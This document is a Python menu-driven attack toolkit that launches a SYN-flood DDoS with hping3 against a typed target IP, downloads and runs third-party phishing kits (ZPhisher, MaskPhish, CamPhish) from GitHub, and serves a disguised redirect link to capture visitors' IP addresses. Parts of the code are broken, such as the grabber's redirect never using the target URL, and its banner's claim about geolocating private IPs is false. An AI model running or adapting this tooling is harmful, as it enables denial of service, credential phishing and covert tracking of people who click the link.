#!/usr/bin/env python3
import subprocess
import os
import time
import shutil
import socket
import requests
import json
import ipaddress
from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import urlparse
from colorama import Fore, Style, init
import threading

# Initialize colorama
init()

def clear_console():
    os.system('clear')  # Clear the console

def center_text(text):
    terminal_width = shutil.get_terminal_size().columns
    centered_lines = [line.center(terminal_width) for line in text.strip().split('\n')]
    return "\n".join(centered_lines)

def print_centered(text):
    print(center_text(Fore.RED + text + Style.RESET_ALL))

# ASCII Art Logo
logo = """
------------------------------------
 ┳┳┓┏┓┏┓┏┓┏┓  ┏┓┓ ┳┏┓┳┓┏┳┓
┃┃┃┏┛┏┛┏┛┃┃  ┃ ┃ ┃┣ ┃┃ ┃
   ┛ ┗┗┛┗┛┗┛┗┻  ┗┛┗┛┻┗┛┛┗ ┻ v2
created by mdalam-4986
and iamgeo1

Make a Selection: 
1. IP Toolkit
2. MaskPhish
3. ZPhisher
4. CamPhish
5. DDoS Attack
6. Port Scanner
7. Simple IP Grabber
8. Exit

-More features coming soon-
mdsec-ver2.py (beta)
------------------------------------
"""

# Function to clone and run a git repository
def clone_and_run(repo_url, dir_name, script_name):
    if not os.path.exists(dir_name):
        print_centered(f"Cloning {repo_url}...")
        result = subprocess.run(['git', 'clone', repo_url], capture_output=True, text=True)
        if result.returncode != 0:
            print_centered(f"Error cloning repository: {result.stderr.strip()}")
            return
    
    os.chdir(dir_name)
    # Run the specified script
    if os.path.isfile(script_name):
        print_centered(f"Running {script_name}...")
        subprocess.run(['bash', script_name])
    else:
        print_centered(f"No {script_name} file found. Please check the repository.")
    os.chdir('..')  # Change back to the original directory

# DDoS Functionality
def ddos_function():
    clear_console()
    ddos_art = """
┳┓┳┓  ┏┓  ┏┓┏┳┓┏┳┓┏┓┏┓┓┏┓
┃┃┃┃┏┓┗┓  ┣┫ ┃  ┃ ┣┫┃ ┃┫ 
┻┛┻┛┗┛┗┛  ┛┗ ┻  ┻ ┛┗┗┛┛┗┛
Tool which does a DDoS attack on a target IP.
Use Port Scanner to find the port to attack on.
(note - 'open ports' are the ones that can be attacked.)
    """
    print_centered(ddos_art)
    target_ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL)
    duration = int(input(Fore.YELLOW + "Duration in seconds: " + Style.RESET_ALL))

    print_centered("Starting DDoS attack...")
    end_time = time.time() + duration

    while time.time() < end_time:
        subprocess.run(['hping3', '--flood', '-S', target_ip])
    print_centered("DDoS attack finished.")
    wait_for_user()

# Port Scanner Functionality
def port_scanner():
    clear_console()
    port_scanner_art = """
┏┓┏┓┳┓┏┳┓  ┏┓┏┓┏┓┳┓┳┓┏┓┳┓
┃┃┃┃┣┫ ┃   ┗┓┃ ┣┫┃┃┃┃┣ ┣┫
┣┛┗┛┛┗ ┻   ┗┛┗┛┛┗┛┗┛┗┗┛┛┗
Tool which scans for open and closed ports for IPs.
    """
    print_centered(port_scanner_art)
    print(Fore.LIGHTGREEN_EX + "Port Scanner" + Style.RESET_ALL)
    
    target_ip = input(Fore.RED + "Target IP: " + Style.RESET_ALL)
    start_port = int(input(Fore.YELLOW + "Start Port: " + Style.RESET_ALL))
    end_port = int(input(Fore.YELLOW + "End Port: " + Style.RESET_ALL))

    for port in range(start_port, end_port + 1):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(4)

        result = sock.connect_ex((target_ip, port))
        
        if result == 0:
            print(Fore.GREEN + f"Port {port} is open" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"Port {port} is closed" + Style.RESET_ALL)
        
        sock.close()

    wait_for_user()

# Class to handle Simple IP Grabber functionality
class SimpleHTTPRequestHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed_path = urlparse(self.path)
        if parsed_path.path.startswith('/redirect/'):
            user_ip = self.client_address[0]
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            response_html = f"""
            <html>
                <body>
                    <h1>Your IP: {user_ip}</h1>
                    <h3>Redirecting...</h3>
                </body>
            </html>
            """
            self.wfile.write(response_html.encode())
            self.send_response(302)
            self.send_header('Location', parsed_path.path[10:])
            self.end_headers()

def run_server(port=8000):
    server_address = ('', port)
    httpd = HTTPServer(server_address, SimpleHTTPRequestHandler)
    httpd.serve_forever()

def start_server_thread():
    server_thread = threading.Thread(target=run_server, args=(8000,))
    server_thread.daemon = True
    server_thread.start()

class IPToolkit:
    def __init__(self, max_entries=5):
        self.max_entries = max_entries
        self.latest_info = []

    def add_latest_info(self, info):
        if len(self.latest_info) >= self.max_entries:
            self.latest_info.pop(0)
        self.latest_info.append(info)

    def get_latest_info(self):
        return "\n".join(self.latest_info) if self.latest_info else "No recent information available."

    def get_local_ip(self):
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        self.add_latest_info(f"Local IP Address: {local_ip}")
        return local_ip

    def get_public_ip(self):
        try:
            response = requests.get('https://api.ipify.org?format=json')
            public_ip = response.json()['ip']
            self.add_latest_info(f"Public IP Address: {public_ip}")
            return public_ip
        except Exception as e:
            self.add_latest_info(f"Failed to retrieve public IP: {str(e)}")
            return None

    def ip_geolocation(self, ip):
        try:
            ip_obj = ipaddress.ip_address(ip)
            if ip_obj.is_private:
                message = "Local IP addresses do not have geolocation information available."
                self.add_latest_info(message)
                return json.dumps({"IP": str(ip_obj), "Message": message}, indent=4)
            else:
                response = requests.get(f"https://ipinfo.io/{ip}/json")
                data = response.json()
                formatted_data = {
                    "IP": ip,
                    "Hostname": data.get('hostname', 'N/A'),
                    "City": data.get('city', 'N/A'),
                    "Region": data.get('region', 'N/A'),
                    "Country": data.get('country', 'N/A'),
                    "Location": data.get('loc', 'N/A'),
                    "Organization": data.get('org', 'N/A'),
                }
                self.add_latest_info(f"Geolocation data for {ip}: {formatted_data}")
                return json.dumps(formatted_data, indent=4)
        except Exception as e:
            return f"Error retrieving geolocation data: {str(e)}"
ipgrabber_art="""
┏┓•     ┓    ┳┏┓  ┏┓    ┓ ┓     
┗┓┓┏┳┓┏┓┃┏┓  ┃┃┃  ┃┓┏┓┏┓┣┓┣┓┏┓┏┓
┗┛┗┛┗┗┣┛┗┗   ┻┣┛  ┗┛┛ ┗┻┗┛┗┛┗ ┛ 
      ┛                         
Tool which sends the IP of anyone clicking a generated link. (Use MaskPhish to make a natural looking link.)
"""

def wait_for_user():
    input(Fore.LIGHTYELLOW_EX + "Press Enter to continue..." + Style.RESET_ALL)

def simple_ip_grabber():
    clear_console()
    print_centered("Starting Simple IP Grabber...")
    print(Fore.RED+ipgrabber_art)

    # Prompt for URL redirection
    redirect_url = input(Fore.RED + "Enter the URL to redirect to (include http:// or https://): " + Style.RESET_ALL)
    url_checker(redirect_url)

    # Create the folder to store captured data
    capture_folder = create_capture_folder()

    # Automatically find a free port
    port = find_free_port()

    # Start the HTTP server with redirect URL
    httpd = HTTPServer(('127.0.0.1', port), SimpleHTTPRequestHandler)
    print_centered(f"IP Grabber is running! Visit http://127.0.0.1:{port} to grab IPs.")
    print_centered(f"Redirecting to: {redirect_url}")

    # Serve indefinitely
    httpd.serve_forever()

def url_checker(url):
    try:
        result = requests.get(url)
        if result.status_code == 200:
            print_centered("Valid URL!")
        else:
            print_centered("Invalid URL!")
    except requests.exceptions.RequestException as e:
        print_centered(f"Error: {e}")

def create_capture_folder():
    folder_name = "captured_ips"
    if not os.path.exists(folder_name):
        os.makedirs(folder_name)
    return folder_name

def find_free_port(start=8000):
    port = start
    while True:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            if s.connect_ex(('127.0.0.1', port)) != 0:
                return port
            port += 1
toolkit_menu = """
┳┏┓  ┏┳┓    ┓┓┏┓• 
┃┃┃   ┃ ┏┓┏┓┃┃┫ ┓╋
┻┣┛   ┻ ┗┛┗┛┗┛┗┛┗┗
Useful tool that can geolocate private IPs.                  
"""

def main_menu():
    while True:
        clear_console()
        print_centered(logo)
        choice = input(Fore.RED + "Choose an option: " + Style.RESET_ALL)
        if choice == '1':
            print_centered("Launching IP Toolkit...")
            time.sleep(1)  # Simulate some loading time
            start_server_thread()
            ip_toolkit = IPToolkit()
            ip_toolkit.get_local_ip()
            public_ip = ip_toolkit.get_public_ip()
            print(Fore.RED+toolkit_menu)
            print(Fore.LIGHTGREEN_EX + ip_toolkit.get_latest_info() + Style.RESET_ALL)

            # Prompt for geolocation
            ip_to_check = input(Fore.RED + "Enter an IP address to find its location: " + Style.RESET_ALL)
            geo_info = ip_toolkit.ip_geolocation(ip_to_check)
            print(Fore.LIGHTGREEN_EX + geo_info + Style.RESET_ALL)
            wait_for_user()
        elif choice == '2':
            clone_and_run("https://github.com/jaykali/maskphish.git", "maskphish", "maskphish.sh")
            wait_for_user()
        elif choice == '3':
            clone_and_run("https://github.com/htr-tech/zphisher.git", "zphisher", "zphisher.sh")
            wait_for_user()
        elif choice == '4':
            clone_and_run("https://github.com/techchipnet/CamPhish.git", "CamPhish", "camphish.sh")
            wait_for_user()
        elif choice == '5':
            ddos_function()
        elif choice == '6':
            port_scanner()
        elif choice == '7':
            simple_ip_grabber()
        elif choice == '8':
            print_centered("Exiting the application.")
            break
        else:
            print_centered("Invalid choice, please select a valid option.")

if __name__ == "__main__":
    main_menu()

